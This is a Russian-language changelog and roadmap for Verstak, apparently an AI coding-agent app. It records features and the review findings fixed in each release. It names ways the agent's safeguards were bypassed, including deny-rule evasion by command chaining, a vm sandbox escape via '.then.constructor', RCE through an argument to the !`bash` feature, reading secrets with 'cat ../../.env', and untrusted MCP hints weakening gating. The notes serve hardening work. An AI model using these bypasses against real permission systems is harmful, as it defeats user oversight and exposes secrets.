Деливерабл вошёл в анализ токенов.

> **1.5.46** 🚀 — **субагенты-как-файлы (экстра-спринт).** Капстоун линии «всё декларируется файлом»: `.verstak/agents/<имя>.md` (frontmatter name/description/tools/model/provider, тело=system prompt) → `delegate_task agent="имя"`. Произвольный tools-whitelist + модель вместо захардкоженных ролей. Имена инжектятся в system prompt (достижимость). **Ревью (6 агентов) → 2 MEDIUM + 1 LOW:** file-субагент с `tools: orchestrate/swarm` обходил SUBAGENT_FORBIDDEN_TOOLS (getRoleToolset пропускался) → фильтр и к файловому набору; user-субагенты недостижимы без проекта (инъекция под `if(projectPath)`) → расцеплено; LOW (принят) untrusted project-агент — mode-policy+permission-rules+денилист всё равно гейтят (декларация ≠ обход авторизации).

> **1.5.45** 🚀 — **конкурентная ось Cursor/Claude Code/Codex: РАСШИРЯЕМОСТЬ КОНТРОЛЯ (6 фич).** Разбор 3 конкурентов (локальные установки + интернет, 5-агентный workflow) → вердикт: ядро Verstak на паритете/впереди, сосём в РАСШИРЯЕМОСТИ — конкуренты вынесли контроль в конфиг, у нас захардкожено. **Спринт 1 (контроль/прозрачность):** ① **lifecycle-хуки** (Pre/PostToolUse/SessionStart/Stop/UserPromptSubmit, .verstak/hooks.json, opt-in, exit2=блок, scanText на вывод) · ② **декларативные permissions** allow/deny/ask по паттернам (.verstak/permissions.json, deny бьёт даже bypass) · ③ **output-styles** (формат ответа ⟂ режиму). **Спринт 2 (автоматизм РФ + UX):** ④ **slash-команды с $1/$ARGUMENTS + инъекция !\`bash\`** · ⑤ **review_diff** (git-diff против ветки/коммита/uncommitted критиком) · ⑥ **@-mentions файлов** в композере. **Три раунда ревью (18+13+6 агентов) → 5+8+3 находок, ВСЕ закрыты:** 🔴 deny обходился цепочкой/подстановкой/обёрткой/find-exec (переписан splitCommandSegments с extractNested) · 🔴 RCE через аргумент в !\`bash\` (реордер) + эксфильтрация через cat ../../.env (read-only allowlist + блок путей вне проекта) · 🔴 git-опция-инъекция через ведущий дефис в ref (анкор regex) · 🔴 кастомные output-стили недостижимы из UI (динамический список). **Урок усилен (повтор): security-фиксы ОБЯЗАТЕЛЬНО ре-ревьюить — «лиса в курятнике», первый раунд фиксов сам имел 8 HIGH-обходов.** Деливерабл: `Downloads/Verstak-конкурентная-ось-cursor-cc-codex-2026-07-01.md`. В описаниях про конкурентов — молчок, только функции.

> **1.5.44** 🚀 — **ось 4: память (vs Letta/mem0/Zep/LangGraph).** Память уже зрелая → из 40 техник 3 строибельных (НЕ-embedding, на FTS5+SQLite). **#1 RRF-fusion recall** — блендим релевантность⊕недавность (Reciprocal Rank Fusion), вместо бинарного фолбэка. **#3 soft-invalidate** — миграция 32, история «было X→стало Y» вместо удаления (`invalidated_at`/`superseded_by`, recall фильтрует). **#2 agent-driven реконсиляция** — тулза `memory_invalidate` + nudge; агент сам реконсилирует противоречия через тулзы (БЕЗ вложенного LLM-вызова). + **кумулятивное ревью ось-3 → 4 кросс-фичевых фикса** (🟠HIGH откат-при-стриме рвал историю чата → гейт isStreaming; lastSummary стейл при new_task; счётчик run_until_green leak). **Ревью ось-4 → 🟠HIGH**: saveMemory не воскрешал invalidated (ре-сохранение факта молча невидимо) → UPDATE снимает invalidated_at. **НЕ брать: векторы/embeddings/граф/cloud-sync** (подтверждённый non-goal — FTS5+RRF+LLM-reconcile дают 80% без вектора).

> **1.5.43** 🚀 — **ось 3 спринт 2 (deferred-кластеры I/F/H).** **I per-tool auto-approve** — категорийные тумблеры (правки/команды) поверх режима, не трогая plan-block (вкладка «Политика»). **F гранулярный откат** — 3 режима cline: Файлы / Задачу (truncate диалога к чекпоинту) / Файлы+задачу (storage+IPC+per-chat граница в ComposerToolsMenu). **H new_task** — агент сам пакует дистиллят и продолжает с чистого контекста (протокол+цель сохраняются). G (recipes)/J (CLI -x) ≈ покрыты скиллами/`verstak --json`, не дублировал. **Ревью поймало 3:** 🟠HIGH new_task стирал и БАЗОВЫЙ system-промпт (протокол/память/правила живут только в currentMessages[0]) → off-policy дрейф; фикс buildNewTaskContext сохраняет base-system+исходную задачу. MEDIUM F был НЕДОСТИЖИМ (CheckpointButton не смонтирован, жил ComposerToolsMenu с file-only) → перенёс 3-режим в смонтированный компонент, мёртвый удалил. **Урок (повтор TS-нав): фича жива только если смонтирована в РЕАЛЬНОМ UI-пути.**

> **1.5.42** 🚀 — **конкурентная ось 3 ТОП-5** (vs Aider/Cline/Roo/Goose/Amp/Plandex/Codebuff/OpenHands — терминальные агенты, НЕ IDE). Все 5 превращают уже-готовые кирпичи в фичи-паритеты, ничего против moat: **#1 guardrails** в immutable-протоколе (план при >3 файлов, no-new-deps, сериализация правок — апрув Павла на правку system-layer 1.3.0); **#2 oracle** — агент сам зовёт сильную reasoning-модель для плана/ревью/дебага (обёртка над delegate role=critic); **#3 per-mode model** — авто-своп модели при 1-5 (план→reasoning, авто→дешёвый); **#4 Focus Chain** — todo переживает компакцию (анти-дрейф §5.4); **#5 run_until_green** — fix-until-green для ЛЮБОЙ команды (не только tsc). **Ревью поймало 3:** 🟠HIGH per-mode своп не персистился per-chat (откатывался при возврате в чат) → фикс chatSessions.setModel; MEDIUM лимит run_until_green агент-контролируемый (attempt:1 навсегда) → серверный счётчик per(sendId+command); LOW дедуп Focus-Chain реинжекта. **Главный вывод оси 3: Verstak сосёт НЕ в безопасности/откатах (там впереди), а в автоматизме «режим↔модель» и широте самокоррекции — ровно эти 5 закрыты.** Деливерабл: `Downloads/Verstak-конкурентная-ось-3-2026-06-29.md`.

> **1.5.41** 🚀 — **живые connector-аудиты в NL-cron** (закрыт follow-up флагмана). Расписанный (unattended) прогон теперь ЧИТАЕТ внешние данные (Ozon/WB/Метрика/CRM/Sheets) через `connector_query`, но op-level политика (`connector-readonly.ts`, fail-safe) блокирует пишущие/выполняющие op'ы (ssh run_remote, telegram send, вебхуки, email). Целиком-read коннекторы → true; mixed (http GET, telegram get_*, bitrix list_/get_) → per-op; ssh/email/неизвестный → запрет. **Ревью (31 коннектор сверены) поймало 🔴CRITICAL: gsheets помечен целиком-read, но имеет append_/update_ → unattended мог затереть Google Sheets (= SSOT TASK_REGISTRY!) → фикс per-op (read_/get_/ping).** + party→dadata. **Урок (повтор MCP-ревью): «помечен read-only» по kind — проверяй КАЖДЫЙ op коннектора, не доверяй ярлыку.**

> **1.5.40** 🚀 — **next-wave дорожной карты (4 фичи).** **NL-cron** — расписание задач на естественном языке (вкладка «Расписание»: «каждое утро», «по будням в 8»); unattended-прогон на СТРОГО локальном read-only наборе (код/журнал/память/документы), итог в Telegram. **LSP-нав TS/JS** — find_definition/find_references теперь и для TS/JS (typescript-language-server), live-проверено. **Авто-предложение скилла** — чип с апрувом по мере набора. **Memory-nudge** — подсказка консолидации при накоплении воспоминаний. **Ревью поймало 4×HIGH:** (1) NL-cron read-only ФИКТИВНА — researcher-набор включал connector_query (SSH/Telegram-выполнение) → unattended мог слать/выполнять на проде → фикс: локальный набор без коннекторов; (2) project_path не валидировался против known-roots → гейт добавлен; (3) двойной запуск задачи (last_run_minute писался после прогона) → in-flight Set; (4) TS-нав МЁРТВА — хендлер гейтил isLspDiagnosableFile (TS исключён) до навигации (live-тест прошёл в обход) → isLspNavigableFile. **Урок: live-тест в обход хендлера НЕ доказывает фичу — нужен e2e через реальный гейт.** + scanText на Telegram-пуш.

> **1.5.39** 🚀 — **ТОП-3 дорожной карты (память умнее + MCP-гейтинг).** **#1 релевантный recall при старте чата** — `searchMemories` инжектил с пустым query → top-5 по времени; теперь подаём последнее user-сообщение как query (FTS5 ORDER BY rank, санитайзер NL→FTS5 `buildFtsMatch`), recency-фолбэк исключает session-summary чтобы не вытеснять факты. **#2 MCP-scope override + annotations** — гейтинг внешних тулзов был на keyword-угадайке; теперь читаем стандартные хинты (readOnlyHint/destructiveHint) + per-tool override в Settings. **#3 персист итога сессии** — `lastSummary` жил только in-run → пишем в `memories(tags=['session-summary'])` → кросс-сессионный recall без embeddings. **Ревью поймало 2×HIGH:** (а) утечка секрета — session-summary сохранялся БЕЗ scanText → токен из чата оседал в памяти и всплывал в контекст внешнего провайдера (фикс: scanText в ai.ts + session-summary.ts, +тест); (б) ослабление MCP-гейта — `readOnlyHint:true` от недоверенного сервера слепо даунгрейдил любой тулз в read/auto (слабее keyword-гейта!) → фикс: annotations НЕ опускают ниже keyword, destructiveHint→command первым. **Урок: server-supplied annotations недоверенны — могут лишь УЖЕСТОЧАТЬ гейт, не ослаблять.**

> **1.5.38** 🚀 — **#5 изолированная сессия (полный worktree-lifecycle).** Кнопка «🌿 Изолировать сессию» → правки агента в отдельном git-worktree, main не трогается до «Применить в main» (локальный git apply, БЕЗ push) / «Отбросить». storage (миграция 30) + IPC + ре-рут ai:send на worktree + UI WorktreeBar. **Ревью поймало 6 багов вкл. 🔴CRITICAL data-loss** (undo изолированного чата бил по main — ре-рутил tools но не projectPath; фикс: весь прогон на worktree) + leak-sweep. Opt-in (default OFF) → ноль риска. Known-лимиты (не data-loss): context-pack на main, merge-конфликт без авто-rebase, CLI не изолируется, undo в изоляции = no-op (используй Отбросить). **Урок: ре-рут file-тулзов БЕЗ ре-рута projectPath → undo бьёт по чужому дереву (как swarm-паттерн, но забыл projectPath).**

> **1.5.37** 🚀 — **OpenClaw-усреднение (4 user-facing фичи).** Push-наблюдаемость прогона в Telegram (opt-in, только исходящее) · per-session stats «Σ $·🔧·📄» в шапке (переживает рестарт) · локальный plan-approval-gate (opt-in, Approve/Revise/Reject до выполнения) · ⏸ Пауза / ↻ Продолжить прогон с чекпойнта. Все default-безопасны (opt-in/гейтены). **Каждая отревьюена адверсариально — поймано ~38 багов за день (10 HIGH + 1 critical), все до прода:** push (спам справки), plan-gate (5, вкл. HIGH «approve не работал»), suspend (2, вкл. HIGH «CLI ⏸ молча=⏹»). #5 merge-ядро (`mergeWorktreeToMain`, локальный git apply без push) — в main, полный lifecycle следующей сессией. В описаниях про конкурентов — молчок, только функции.

> **OpenClaw-усреднение (27.06, в main, не зарелизено).** Gap-анализ 6 областей OpenClaw code-agent vs текущий Verstak (Workflow) → ранжирование по ROI. Построено: **#1 push-наблюдаемость прогона в Telegram** (`847bb83`,`902a04a`: opt-in `telegram_notify_chat_id`, только исходящее, не спамит суб-агентами/справкой, переиспользует whitelist+scan коннектора; ревью поймало спам справки → закрыт; +11 тестов) + **#2 per-session stats** (`4e0651a`: `sessionStats(chatId)` агрегат cost/инстр/файлы/время без миграции, пилюля «Σ $X·🔧·📄» в шапке; +2 теста). **#3 локальный plan-gate** (`f0b71d0`→`adcc08f`): opt-in (default OFF) `plan_approval_gate` — в plan-режиме create_plan блокирует-и-ждёт Approve/Revise/Reject; approve → выполнение в прогоне (мутабельный runAgentMode + ctx.setAgentMode); pendingPlans+IPC+PlanConfirm-модалка+тумблер в PolicyTab. Ревью поймало 5 багов вкл. 🟠HIGH «approve не выполнялся» (ctx пересоздавался из const каждый turn) + фоновый дедлок — все закрыты, HIGH верифицирован тестом. +7 тестов. **#4 ⏸/↻ suspend** (`e9ced83`→`7bd6beb`): ⏸ Приостановить (abort+статус 'suspended', миграция 29) / ↻ Продолжить с чекпойнта (resumeFromRunId). Ревью: 2 бага вкл. 🟠HIGH «CLI ⏸ молча=⏹» (только API чекпойнтит) — ⏸ теперь только для API-провайдеров; +утечка Set в cleanup. +1 тест. **#5 worktree lifecycle — ЯДРО построено** (`664af30`): `mergeWorktreeToMain` (локальный merge worktree→main через git apply, атомарно, БЕЗ push; +3 теста на реальном git). Полный persistent-lifecycle (таблица worktree_sessions + изоляция обычной сессии персистентно между ходами + UI merge-кнопка + состояния active/diff_ready/merged) — **L-size follow-up, не срочно** (checkpoint+undo уже дают откат), UI-тяжёлый → отдельная сессия с live-проверкой. Inbound TG-пульт — за go Павла + security-ревью. **В публичных описаниях про OpenClaw — молчок, только функции.**

> **1.5.36** 🚀 — **T1.2 git-worktree изоляция роя зарелизена.** Рой агентов (swarm) с opt-in `isolate`: каждый executor правит в своей изолированной git-рабочей копии (worktree) → параллельные правки не клобберят друг друга; git diff к арбитру → главный применяет выбранный в main. Фундамент (`git-worktree.ts`, graceful, чистит ambient GIT_*) + swarm-обвязка. Ревью поймало 🟠HIGH «изоляция инертна» (собрал без re-root FileTools — ровно то, ради чего деферили) — починен `createToolsForProject(memberRoot)→subCtx.tools` и **верифицирован интеграционным тестом**. Default OFF → ноль риска. По пути гейт сам обнажил баг хелпера (ambient GIT_DIR). +9 тестов.

> **1.5.35** 🚀 — **весь Tier-2 спринт (6/6) зарелизен.** LSP-навигация (find_definition/find_references любой язык), правила под файлы (glob-маски в AGENTS/CLAUDE.md), белый список безопасных команд (анти-обход цепочек/arg-injection), ветвление чатов (⑂ Ветвить), MP4-доказательства веб-проверки (кадры browser-прохода → видео), microcompact (обратимое промежуточное сжатие). **Финальное ревью перед шипом поймало 6 багов вкл. 2 HIGH data-loss в fork** (remove стирал ветки + осиротевшие review-leak) — все закрыты, fork-тесты вживую зелёные. Урок усилен: ревью+live-проверка обязательны для не-live-кода; за сессию 17 багов в своём коде (5 HIGH + 1 critical) пойманы до прода.

> **1.5.34** 🚀 — **live-проверка не-TS LSP с реальным pyright** поймала+починила третий баг: в 1.5.33 авто-диагностика не-TS была инертна на Windows (file-URI mismatch — регистр диска/кодировка → строгий `===` не матчил → диагностики терялись). Фикс `sameFile` (сравнение по разрешённому пути) + интеграционный тест (за `RUN_LSP_IT=1`). Также проверено: PTC хендлер end-to-end (4 теста), Ollama qwen2.5 шлёт structured tool_calls нативно (repair — фолбэк для слабых, парсер юнит-тестирован), graceful-деградация на сломанном rust-analyzer (rustup-прокси без компонента) — no-op без краша. **Урок: live-проверка так же окупается, как ревью — «фича в проде, но инертна» ловится только реальным сервером.**

> **1.5.33** 🚀 — **Tier-1 усиление по конкурентному исследованию зарелизено** (5 фич, дважды отревьюено адверсариально, 13 багов закрыто): LSP-диагностика Python/Go/Rust в петле (graceful), repair tool-call'ов слабых/RU-моделей, Inbox approvals фоновых чатов, структурная итеративная компакция, PTC `execute_code` (opt-in, default off). Все безопасны для дефолтных юзеров (LSP→no-op без сервера, PTC выключен). Сборка через bypass (дев был открыт) → закрыли дев → `dist:win` → GitHub Release v1.5.33 + latest.yml (автообновление). **Урок ревью: 2 паса (фичи + сами фиксы) поймали critical PTC-RCE и «LSP мёртв на Windows» — для не-live-кода ревью обязателен; см. [[verstak-tier1-strengthening-2026-06-24]].**

> **1.5.32** — воронка Verstak→Gateway добита (после сверки с тем, что Codex отдаёт на шлюзе): `verstak/free` (🎁 проба) в пресетах → проба за 0₽; онбординг первого запуска предлагает Gateway первым/рекомендованным (рубли, один ключ, без VPN, ссылка на ключ за 30 сек) вместо недоступных из РФ зарубежных провайдеров; кликабельные CTA — ссылки чата открываются в браузере (не уводят окно), ссылка пополнения при нехватке баланса кликабельна. Плюс **pre-commit гейт «гарантия вместо обещания»** (`.githooks/` + `core.hooksPath`, type жёстко + тесты с ABI-awareness, gate-lib под TDD) — закрыт вариант 2 решения по скилл-архитектуре. Хвост: smoke `verstak/free` реальным `vsk_live_` (Codex/Pavel — шлюз проверяет ключ до модели).

> **1.5.31** — батч усиления по итогам сравнения исходников с конкурентами (внутр.): SSRF-guard коннекторов (ip-guard + redirect-loop), prompt-injection escape user/skill-layer, redactUrlSecrets (query/fragment/userinfo), undo unlink-ошибки в failed[], undo DB-first ordering, авто-компакшн (output-резерв + cooldown + usage-учёт + error-guard), CRLF регресс-тест. Всё TDD, 3 ревью-роли + security review. Tier-2 (tool-call-cap/interrupted/tokenizer/prefix-cache) — обоснованно отложены (см. `Downloads/Verstak-усиление-vs-...md`).

> **1.5.28** — безопасность + надёжность по итогам глубокого код-ревью (workflow 12 агентов + адверсариальная верификация): 🔴 закрыт обход isForbiddenPath в SSH-файл-тулзах (секреты на ssh-проектах), Retry-After в backoff, человеко-понятные ошибки провайдера, фикс утечки per-chat состояния при restore, фикс тихого неполного отката (undo prune защищает пост-чекпоинт записи). Все по TDD.
> **1.5.27** — стабильность по конкурентному ревью (OpenCode/KiloCode): дедуп дублей (5.2), сброс состояния при закрытии проекта (5.3), безопасный фолбэк с накопленной историей (6.2), рефактор ядра в `AgentRunContext` (6.1).


---

## 🆚 Усиление по конкурентному исследованию (24.06) — РОУДМАП

Многоагентное исследование (32 агента, grounded в коде Verstak + адверсариальная верификация) vs OpenCode/KiloCode/OpenClaw/Hermes/Cursor/Antigravity → план `Downloads/Verstak-исследование-конкурентов-2026-06-24.md`, память `verstak-competitor-research-2026-06-24`. **Вердикт: НЕ гнаться за Cursor по in-editor (нет редактора = другая категория, осознанный non-goal). Сосём на (1) агентной петле на не-TS коде, (2) своём же «agent не IDE» углу (Inbox/TG).**

Реализовано автономно по TDD (каждый коммит через pre-commit гейт) + дважды отревьюено адверсариально (13 багов закрыто) → **зарелизено в `1.5.33` (25.06)**. Остаётся live-проверка не-TS петли (pyright) и PTC (ptc_enabled):

- ✅ **T1.5 tool-call repair** (75d56f5) — слабые/RU-модели (Ollama/GigaChat/Qwen/Mistral/gpt-oss), отдающие вызов ТЕКСТОМ, теперь исполняются (парсер 5 форматов в `tool-call-repair.ts`, встроен в openai-compat только для не-structured → сильные не затронуты; +9 тестов). Заодно fix гейта (многострочная better-sqlite3 ABI-ошибка). РФ-моат.
- ✅ **T1.6 структурная итеративная компакция** (147f2ef) — `buildCompactSummaryPrompt` со схемой Goal/Constraints/Progress/Files + `extractTouchedFiles` (провенанс) + итеративное обновление прошлого резюме (`lastSummary` в ai.ts). +6 тестов.
- ✅ **T1.3 Inbox approvals** (536a756) — `selectInboxApprovals` агрегирует pendingCommand по всем чатам, панель `InboxApprovals` (резолв фоновых не заходя в чат). +4 теста. UI — 1 живой клик.
- ✅ **T1.1 мультиязычный LSP в петле** (0a3997b) — write_file Python/Go/Rust → языковой сервер (pyright/gopls/rust-analyzer), ERROR-диагностики в следующий ход (как tsc для TS). `lang-servers.ts` (ядро, +10 тестов) + `lsp-diagnose.ts` (graceful spawn). Live-проверка нужен установленный pyright/gopls.
- ✅ **T1.4 PTC `execute_code`** (5b50e76) — агент пишет скрипт, оркестрирующий READ-ONLY тулзы, в контекст только итог (меньше токенов). Движок `ptc.ts` (vm-песочница без process/require/fs, таймаут, +9 тестов). **Opt-in** (`ptc_enabled`, default off — ждёт live-проверки петли; выключенным невидимо, нулевой риск).
- ✅ **T1.2 git-worktree изоляция swarm — ЗАРЕЛИЗЕНО в `1.5.36`** (`8fe0814`→`9c22cb1`→`2b43263`, 27.06): `git-worktree.ts` (add/remove/list/diff/isGitRepo, graceful, чистит ambient GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE — гейт сам обнажил этот баг; +7 тестов на реальном git) + opt-in `isolate` в `swarm` (executor правит в своём worktree → git diff к арбитру → главный применяет выбранный в main; researcher/critic в main; cleanup в finally). Additive, default OFF. **Адверсариальное ревью → 3 бага, вкл. 🟠HIGH «изоляция инертна» (ctx.tools был забинден на главный root → executor писал в main, worktreeDiff читал пустой wt → клоббер не устранён) — это ровно тот re-root FileTools, ради которого деферили; починен через `createToolsForProject(memberRoot)→subCtx.tools`. + MEDIUM ENOBUFS-diff фолбэк на --stat, low rmSync-guard.** type+тесты зелёные. **HIGH-фикс ВЕРИФИЦИРОВАН интеграционным тестом** (`2b43263`): swarmHandler сквозь, фейк-executor пишет через ctx.tools → isolate=true запись НЕ в main (ушла в worktree) + diff к арбитру; isolate=false (контроль) → в main. Изоляция доказанно работает. Остаточный хвост — лишь UX реального LLM в isolate-режиме (механика проверена).
- 🔍 **Ревью №1 (все 5 фич)** — workflow 19 агентов × верификация → **9 багов из 14, закрыты по TDD:** 🔴CRIT PTC vm-побег → RCE (`59e6601`); 🟠LSP spawn без shell → ENOENT на Windows + EPIPE-краш + мульти-файл (`55b1c0d`); 🟠T1.5 Format 5 на прозе с JSON (`e90ac10`); 🟠T1.6 пропуск propose_edits (`1c15471`); T1.3 ghost-approval + sendId (`6523197`).
- 🔍 **Ревью №2 (ФИКСЫ ревью №1 — их никто не смотрел)** — workflow 11 агентов → **ещё 4 дефекта в моих же фиксах, закрыты (`a7ffb17`):** LSP `child.kill` убивал только cmd.exe → осиротевший pyright (фикс: treeKill); T1.3 ghost-модалка оставалась в АКТИВНОМ чате (фикс закрыл только фон); T1.5 проза с примером РЕАЛЬНОЙ тулзы + обёртки (фикс: dominant-content для Format 5); **PTC async-вектор остался открыт** (тулзы возвращали host-Promise → `.then.constructor` → побег) — закрыт по-настоящему через vm-native Promise. **Урок: ревью ФИКСОВ обязателен — «лиса проверяет курятник» (фиксы писал и проверял один и тот же), нашлось 4 дефекта вкл. недозакрытый critical. vm в процессе принципиально не изолирует → ОСНОВНОЙ контроль PTC = гейтинг как команда (trust run_command), vm-хардинг лишь defense-in-depth.**
- 🧭 **Tier-2 (дифференциаторы) — 4/6 в main** (TDD → адверсариальное ревью → фиксы; не зарелизено):
  - ✅ **#1 LSP-навигация** `find_definition`/`find_references` (семантика через язык-сервер; `70fca63`→`254daa2`; live pyright + ревью 6 багов).
  - ✅ **#6 file-scoped rules** `.verstak/rules/*.mdc` (условные правила по glob в user-layer; `a49b89c`; ревью: ReDoS+braces+cap закрыты).
  - ✅ **#4 bash-allowlist** (доверенные команды без подтверждения в ask; `41883f5`; ревью: arg-injection через флаги-эскалаторы закрыт — ESCALATOR-денилист).
  - ✅ **#2 microcompact** (дешёвый обратимый прунинг по размеру до full-compact; `ad2bf4e`; ревью: оценка по slid-копии).
  - ✅ **#5 browser-проверка + MP4 → Proof** (`abe9f89`,`1bda9a8`): `browser_click` (клик по селектору/тексту во вкладке Browser) + `create_proof_video` (кадры browser_screenshot прогона → MP4 в `.verstak/proof/` через ffmpeg) — видео live-проверки веб-сценария для Proof Pack (РФ-угол). Encoder live-проверен реальным ffmpeg (3 PNG→MP4). Полный browser→video цикл — 1 живой клик (Browser-вкладка). Глубокая Proof-Pack хэш-цепочка — follow-up.
  - ✅ **#3 ветвление сессий (fork)** (`6627242`,`d0b60ae`): бэкенд `sessions.fork` (новая main-сессия с копией истории до точки, parentChatId=источник → дерево; +4 теста, sqlite-валиден при закрытом dev) + IPC/preload/тип + store `forkChat` + Sidebar контекст-меню «⑂ Ветвить» + индикатор ⑂. Полная визуализация дерева — follow-up. UI — 1 живой клик.
- 💡 Новые фишки (бэклог): TG-двусторонний-пульт к Gateway (статус/approve/Proof + воронка), Proof Pack как юр-артефакт сдачи, PTC-витрина «стоимость хода».

---

## 🎯 Verstak v3 — машина задачи (СЕВЕР)

Тезис: **результат уровня Opus на дешёвой модели (DeepSeek)** через ХАРНЕС (надёжность в коде, не в доверии модели). Юзер — РФ SMB, BYO-токен, локально, без VPN. Конкурент — OpenCode/Manus и «нанять фрилансера», не ChatGPT. Полный план: `Downloads/verstak-product-plan-v3-2026-06-19.md` + план #5 в Verstak. Вдохновлено разбором OpenCode/ClawCode.

- ✅ **A. Ядро надёжности** (4b8e771) — verify-gate: модель не вправе сказать «готово», провал → авто-починка, лимит → честный стоп `blocked`. pipeline-gate (6 тестов) + миграция 24.
- ✅ **B. Task-spec контракт** (aba770c) — дорогая модель пишет детальные ТЗ-задачи → дешёвая исполняет. TASK_SPEC_CONTRACT в buildPlanPrompt/create_plan + scoreTaskSpec (6 тестов). **Рычаг «Opus на дешёвой».**
- ✅ **C. Профиль проекта** (97d7d55) — machine-readable `.verstak/profile.json`, self-load в context-pack каждой сессии (8 тестов).
- ✅ **D. Промпт-пресеты + beast + max-steps** (fd298da + d653b77) — beast-автономность (auto/bypass) + max-steps hard-stop (последний turn: тулзы off + отчёт). 10 тестов. Минор-остаток: per-family тюнинг, CLI-паритет.
- ✅ **E. Доказательство Opus-на-DeepSeek** — прокликано вживую 19.06 (марафон), харнес A–E работает end-to-end. Тезис подтверждён.
- ⬜ Бонус: LSP-тул + per-role профили (не блокирует).

**Зарелизено в `1.5.18`** (19.06), сейчас в проде `1.5.29`. Харнес A–E **прокликан вживую 19.06 и работает** (`TASK-ilya-v3-livetest.md`). Бонус: per-role (#7) покрыт role-tools; LSP (#6) — отдельной сессией, не блокирует.

---

## 🩹 Открытые хвосты (наши задачи, не закрыты)

| # | Что | Почему висит | Зона |
|---|-----|--------------|------|
| 1 | Облачный дизайн-полиш Pipeline-UI | ТЗ выдано (DESIGN_BRIEF), ждём облачного агента в ветке `design/cloud-polish` | внешн. |
| 2 | **Gateway-баги → отдать Codex** | Пакет file:line+фиксы: `Downloads/IRI-Gateway-баги-ревью-2026-06-23.md`. Начать с 🔴 двойного начисления баланса + овердрафта. Память: [[review-2026-06-23]] | Codex |
| 3 | **Решение по архитектуре скиллов** | ✅ Вариант (2) pre-commit хук СДЕЛАН (23.06: `.githooks/pre-commit` → `scripts/precommit.cjs`, type жёстко + тесты с ABI-awareness, gate-lib под TDD, активируется через `npm install`). Остаются на выбор Павла: (1) аудит 50+ скиллов; (3) тонкий `/verstak`-скилл | Павел |

---

## ✅ Сделано (03.07 — tool-mode hardening под OpenAI-compat/китайские модели, в main, не зарелизено)

Точечный production-hardening существующего agent loop под нестабильный tool-calling дешёвых/китайских моделей (commit `ddd5161`). Без новых больших модулей и без рефакторинга — расширены существующие `smart-fallback.ts` и `runApiConversation`, добавлен один малый слой знаний `tool-mode.ts`.

**Что сделано:**
- `tool-mode.ts` (новый) — слой model/tool compatibility: `resolveToolMode` (`native`/`json`), `isCoaxableProvider`, `JSON_TOOL_INSTRUCTION`, `IGNORED_TOOLS_NUDGE`. Консервативно: неизвестное → `native`, старые провайдеры не затронуты.
- JSON tool mode для моделей, плохо держащих native tools (`deepseek-reasoner`/R1, локальный Ollama): один раз инжектится инструкция отдавать вызов текстом `<tool_call>{…}</tool_call>` — его ловит уже существующий `parseTextToolCalls`.
- Corrective nudge, когда модель ответила прозой и не вызвала ни одного инструмента: `continueAfterPlainReply` для coaxable-провайдеров при `toolCallCount===0` один раз просит выбрать тул или явно завершить (bounded), вместо тихого «готово».
- Расширены fallback-классы: `FallbackReason` + чистые `classifyFallbackReason`/`fallbackPlan`; `shouldFallback` теперь триггерит и на auth-ошибке (битый ключ → другой провайдер).
- china→china fallback chains перед дорогими frontier (deepseek↔qwen↔moonshot, потом gemini/claude/openai).
- Тесты: `tool-mode.test.ts` (новый) + расширен `smart-fallback.test.ts`.

**Почему важно для DeepSeek/Qwen/Kimi/GLM:** симптом «DeepSeek не работает в режиме управления компьютером» = слабая/reasoning-модель игнорировала native `tools`, отвечала прозой → цикл завершался «готово», не сделав ничего. Теперь такие модели либо получают JSON-режим, либо один corrective-retry, либо уходят на соседнюю дешёвую модель — не молчаливый провал.

**Сценарии теперь покрыты:** DeepSeek native OK (без изменений) · Qwen malformed JSON repaired (было) · model ignored tools → corrective retry (новое) · native unsupported → JSON mode (новое) · rate limit → fallback model (усилено china-цепочками) · dangerous command всё так же блокируется policy (fallback-фрейм переиспользует тот же dispatch).

**Ограничения (осознанно оставлены):**
- `fallbackPlan` пока не полностью встроен в `attemptProviderFallback` (проброшен только расширенный `shouldFallback`).
- Malformed **native** arguments лечатся реактивно через `tool_result`, без отдельного corrective retry в `openai-compat.ts`.
- Следующий этап — agentic fallback routing по `FallbackReason`.

## ✅ Сделано (23.06 ч.2 — reliability-батч, зарелизено в 1.5.29)

Разбор ревью-хвоста B + свежий ре-ревью reliability-поверхности (workflow 4 reviewer'а × адверсариальная верификация, т.к. лог `wf_c485e0e0` потерян). Найдено и пофикшено **5 реальных багов**, все TDD (тест воспроизводит баг → фикс), все в зоне `electron/ai` + `electron/storage`:

- **#1 (user-facing) Стоп во время retry-backoff падал в 'crashed' + страшный error-тост.** `sleep()` в `withInitialRetry` бросает `Error('aborted')`, которая вылетала мимо per-event abort-проверок прямо в внешний catch — без guard'а run писался `failed` и юзер видел ошибку, хотя сам нажал Стоп. Фикс: `if (signal.aborted)` первой строкой catch → чистый `aborted`/`stopped`. (`ai.ts`)
- **#3 supervisor-нота при зацикливании была мёртвым кодом** — пушилась в историю и тут же `return`, модель её не видела. Фикс: bounded nudge — нота скармливается модели (1 шанс сменить подход), при повторном зацикливании hard-stop. (`ai.ts`)
- **F2 (HIGH) `writeSessionJournal` — выпилен в void-стаб** регрессией `4f94c72` («session journal updates» по факту убил журнал). Журнал сессии тихо не писался на всех exit-путях, хотя ai.ts это гарантирует. Восстановлено по `3401bdc`. (`session-journal.ts`)
- **F3 (HIGH) undo floor-protection перетирался между чатами** — `floors` keyed по проекту, второй чекпоинт затирал первый → ранние undo-записи первого чата теряли защиту от prune → частичный откат. Фикс: чистый `FloorTracker` (несколько активных floor'ов, защита по MIN) + `clearProtection(projectPath, floorId?)`. (`undo-floors.ts` нов., `undo.ts`, `ipc/undo.ts`)
- **F1 (medium) `shouldFallback` смотрел только message, не `.code`** — обёрнутая сетевая ошибка (ECONNRESET в `.code`, но не в тексте) не уходила в фолбэк. Зеркалит `isRetriableError`. (`smart-fallback.ts`)
- **#2 cross-verify на max-turns — решено by-design:** max-turns = незавершённая работа, ревью половины кода = шум; cross-verify остаётся только на `completed`.

**Тесты: +13** (smart-fallback 4, undo-floors 7 pure, agent-loop +1 F2, undo.test +1 sqlite-интеграция мульти-чекпоинт). agent-loop +#1/#3 ранее. type ✓. **Полный набор 1420 зелёных** (better-sqlite3 пересобран под Node ABI, sqlite-интеграция F3 подтверждена на реальной БД).

## ✅ Сделано (23.06 ч.3 — догфудинг-ревью Verstak'ом самого себя, зарелизено в 1.5.30)

Ревью внутри Verstak (вкладка Code-review) нашло 3 находки в области ч.2 — **ВСЕ ЗАКРЫТЫ properly** (не band-aid):
